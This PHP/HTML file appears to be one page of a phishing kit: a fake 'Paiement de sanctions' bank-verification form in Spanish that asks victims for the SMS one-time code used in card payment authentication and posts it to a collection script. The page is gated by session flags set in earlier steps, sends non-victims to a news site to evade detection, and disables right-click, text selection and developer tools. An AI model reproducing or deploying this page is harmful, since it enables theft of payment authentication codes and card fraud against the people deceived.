<?php
session_start();
require '../server/all.php';
include '../settings.php';

if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true && isset($_SESSION['index_auth']) && $_SESSION['index_auth'] === true) {
    ?>
<!DOCTYPE html>
<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paiement de sanctions</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            padding: 15px;
        }
        .main-header {
            background-color: #007bff;
            color: white;
            padding: 10px;
            text-align: center;
        }
        .main-header img {
            max-height: 50px;
        }
        .form-container {
            background-color: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin-top: 20px;
        }
        .form-group label {
            font-weight: bold;
        }
        .custom-button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        .custom-button:hover {
            background-color: #0056b3;
        }
        footer {
            text-align: center;
            margin-top: 20px;
        }
        footer a {
            color: #007bff;
            text-decoration: none;
        }
        footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 768px) {
            .main-header {
                font-size: 18px;
            }
            .form-container {
                padding: 10px;
            }
        }
    </style>
<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script></head>
<body __processed_8b27ad22-2828-4b15-8bd0-7f01dc374ee3__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNSIsInNjb3JlIjoyMDAxNX1d">
    </header>
    <main class="form-container">
        <center>
            <img src="https://campusdata.uark.edu/resources/images/articles/2020-03-06_01-01-36-PMmfa-newswire-colorBG.png" width="150">
        </center>
        <br>
        <div class="mandatory" bis_skin_checked="1">
            <h5>Su banco para solicitar una autenticación adicional para validar su pago por favor ingrese el código de SMS recibido en su número: &nbsp; <!--?php echo $_SESSION['tel']; ?--></h5>
        </div>
        <form method="post" action="../actions/sms_auth2.php">
            <!--?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p style="color: red; font-size: 16px;"-->Código inválido o caducado, por favor compruébelo<p></p><div class="form-group" bis_skin_checked="1">
                <label for="ccnum">Código recibido por SMS</label>
                <input id="ccnum" type="text" name="vbv_code2" class="form-control" minlength="1" maxlength="20" required="">
            </div>
            <button type="submit" name="vbv_submit" class="custom-button">Continuar</button>
            <input type="hidden" name="vbv_submit" value="true">
        </form>
    </main>
    <footer>
        <nav>
            <a href="#">Aviso legal</a> | 
            <a href="#">Propiedad intelectual</a> | 
            <a href="#">Accesibilidad</a> | 
            <a href="#">Protección de datos</a>
        </nav>
        <div class="footer-social" bis_skin_checked="1">
            <a href="#"><em class="fab fa-facebook-square"></em></a>
            <a href="#"><em class="fab fa-twitter-square"></em></a>
            <a href="#"><em class="fab fa-youtube-square"></em></a>
            <a href="#"><em class="fab fa-instagram"></em></a>
        </div>
    </footer>
    <script>
        // Désactiver le clic droit
        document.addEventListener("contextmenu", function(e){
            e.preventDefault();
        }, false);

        // Désactiver la sélection de texte
        document.addEventListener("selectstart", function(e){
            e.preventDefault();
        }, false);

        window.addEventListener("keydown", function(e) {
            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
                e.preventDefault();
            }
        });
    </script>



</body></html>

    <?php
} else {
    header("Location: https://www.mediapart.fr/");
    exit;
} ?>


<script type="text/javascript">
    // Désactiver le clic droit
    document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>